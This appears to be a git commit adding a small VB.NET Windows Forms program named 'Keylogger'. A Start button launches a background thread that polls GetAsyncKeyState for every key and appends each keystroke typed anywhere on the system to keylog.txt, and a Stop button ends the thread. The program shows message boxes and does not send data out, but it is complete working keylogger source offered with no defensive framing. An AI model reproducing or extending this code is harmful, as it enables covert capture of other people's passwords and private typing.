3fbe8a6d1dc810e4329e8a3464dca799e659ddb1
Xyy <Xyy@DESKTOP-NK1R4GR>
2024-12-03 00:20:19 +0800

    Add project files.

---
+++ Keylogger/Form1.Designer.vb
@@ -0,0 +1,62 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()>
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()>
+    Private Sub InitializeComponent()
+        btnStart = New Button()
+        btnStop = New Button()
+        SuspendLayout()
+        ' 
+        ' btnStart
+        ' 
+        btnStart.Location = New Point(12, 12)
+        btnStart.Name = "btnStart"
+        btnStart.Size = New Size(213, 51)
+        btnStart.TabIndex = 0
+        btnStart.Text = "Start"
+        btnStart.UseVisualStyleBackColor = True
+        ' 
+        ' btnStop
+        ' 
+        btnStop.Location = New Point(12, 69)
+        btnStop.Name = "btnStop"
+        btnStop.Size = New Size(213, 56)
+        btnStop.TabIndex = 1
+        btnStop.Text = "Stop"
+        btnStop.UseVisualStyleBackColor = True
+        ' 
+        ' Form1
+        ' 
+        AutoScaleDimensions = New SizeF(8F, 19F)
+        AutoScaleMode = AutoScaleMode.Font
+        ClientSize = New Size(246, 137)
+        Controls.Add(btnStop)
+        Controls.Add(btnStart)
+        Name = "Form1"
+        Text = "Form1"
+        ResumeLayout(False)
+    End Sub
+
+    Friend WithEvents btnStart As Button
+    Friend WithEvents btnStop As Button
+
+End Class
---
+++ Keylogger/Form1.vb
@@ -0,0 +1,79 @@
+﻿Imports System.IO
+Imports System.Runtime.InteropServices
+Imports System.Threading
+
+Public Class Form1
+    ' Import the necessary WinAPI function
+    <DllImport("user32.dll", SetLastError:=True)>
+    Private Shared Function GetAsyncKeyState(ByVal vKey As Integer) As Short
+    End Function
+
+    ' Thread for keylogging
+    Private keylogThread As Thread
+    Private loggingActive As Boolean = False
+
+    ' Start button click event
+    Private Sub btnStart_Click(sender As Object, e As EventArgs) Handles btnStart.Click
+        If Not loggingActive Then
+            loggingActive = True
+            keylogThread = New Thread(AddressOf StartKeylogging)
+            keylogThread.IsBackground = True
+            keylogThread.Start()
+            MessageBox.Show("Keylogging started!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information)
+        End If
+    End Sub
+
+    ' Stop button click event
+    Private Sub btnStop_Click(sender As Object, e As EventArgs) Handles btnStop.Click
+        If loggingActive Then
+            loggingActive = False
+            If keylogThread IsNot Nothing AndAlso keylogThread.IsAlive Then
+                keylogThread.Join() ' Wait for the thread to finish
+            End If
+            MessageBox.Show("Keylogging stopped!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information)
+        End If
+    End Sub
+
+    ' Keylogging logic
+    Private Sub StartKeylogging()
+        While loggingActive
+            For i As Integer = 1 To 255 ' Iterate through each key
+                Dim state As Short = GetAsyncKeyState(i)
+
+                If state = -32767 Then ' Check if the key is pressed
+                    Dim key As String = ChrW(i)
+
+                    ' Log special keys
+                    Select Case i
+                        Case 8 ' Backspace
+                            key = "[Backspace]"
+                        Case 13 ' Enter
+                            key = "[Enter]"
+                        Case 32 ' Space
+                            key = "[Space]"
+                        Case Else
+                            ' Add other special key mappings if needed
+                    End Select
+
+                    ' Write the key to a log file
+                    LogKey(key)
+                End If
+            Next
+
+            Thread.Sleep(10) ' Add a small delay to prevent high CPU usage
+        End While
+    End Sub
+
+    ' Method to log keys
+    Private Sub LogKey(ByVal key As String)
+        Try
+            ' Specify the file to save logs
+            Dim logFilePath As String = "keylog.txt"
+
+            ' Append the key to the file
+            File.AppendAllText(logFilePath, key)
+        Catch ex As Exception
+            ' Handle errors (e.g., file access issues)
+        End Try
+    End Sub
+End Class
